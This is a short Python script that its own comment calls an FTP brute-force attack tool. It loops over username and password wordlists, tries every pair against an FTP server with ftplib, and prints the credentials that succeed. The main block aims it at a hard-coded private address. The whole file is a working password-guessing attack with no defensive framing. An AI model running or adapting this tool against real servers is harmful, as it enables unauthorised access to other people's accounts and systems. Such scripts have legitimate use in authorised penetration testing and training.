#!/usr/bin/env python3

#This tool is used for ftp brute force attack
import ftplib


class FTP(object):
    def __init__(self, passwds='../wordlists/nmap.lst'):
        #Read in the usernames file for FTP
        fileobj = open('../wordlists/ftpusernames.lst', 'r')
        self.badusernames = [x.strip() for x in fileobj.readlines()]

        #Read in the passwords file
        fileobj2 = open(passwds, 'r')
        self.passwords = [pw.strip() for pw in fileobj2.readlines()]


    def bruteLogin(self, hostname):
        #Loop through password list
        for password in self.passwords:
            #Ensure you are not trying blank lines or comments.
            if password.startswith('#') is False and password:
                #Loop through usernames
                for username in self.badusernames:
                    # Ensure you are not trying blank lines or comments.
                    if username.startswith('#') is False and username:
                        stat = '[+] Trying: U:{usr} P:{pas}'.format(usr=username, pas=password)
                        print(stat)
                        try:
                            #Trying the actual connection.
                            ftp = ftplib.FTP(hostname)
                            ftp.login(username, password)
                            #Notify if connection is good.
                            stat = '[*] SUCCESSFUL LOGIN S:{ser} U:{usr} P:{pas}'.format(ser=str(hostname), usr=username, pas=password)
                            print(stat)
                            ftp.quit()
                        except:
                            '''Except pass is a terrible habit. We are abusing
                            try and except for connection checking so it is helpful
                            to not care about the expected errors. We are only concerned
                            with successes.
                            '''
                            pass

if '__main__' in __name__:
    test = FTP()
    print(test.bruteLogin('10.1.112.39'))